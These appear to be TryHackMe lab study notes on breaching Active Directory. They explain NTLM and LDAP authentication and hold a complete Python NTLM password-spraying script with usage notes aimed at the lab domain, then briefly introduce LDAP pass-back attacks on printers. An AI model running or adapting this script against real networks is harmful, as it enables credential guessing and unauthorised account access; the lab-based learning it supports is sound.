# Compromising Active Directory

# Breaching Active Directory
## NTLM and NetNTLM
New Technology LAN Manager (NTLM) is the suite of security protocols used to authenticate users' identities in AD. NTLM can be used for authentication by using a challenge-response-based scheme called NetNTLM.   
<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/e39c9f95-dbec-484c-a3f2-6cd244c93fdd" width=600>

### Brute-force Login Attacks  
**Password Spraying**  
<details>
<summary>ntlm_passwordspray.py</summary>  

```
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```

</details>  

```
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>  
# <userfile> - Textfile containing our usernames - "usernames.txt"
# <fqdn> - Fully qualified domain name associated with the organisation that we # are attacking - "za.tryhackme.com"
# <password> - The password we want to use for our spraying attack - "Changeme123"
# <attackurl> - The URL of the application that supports Windows Authentication - "http://ntlmauth.za.tryhackme.com"
```

## LDAP
Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) authentication. With LDAP authentication, the application directly verifies the user's credentials.  
<img src="https://github.com/nkn-ctrl/TryHackMe/assets/73976100/a241a94c-c3d2-446b-b43f-c8330fcc6e25" width=600>  

### LDAP Pass-back Attacks
This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.  
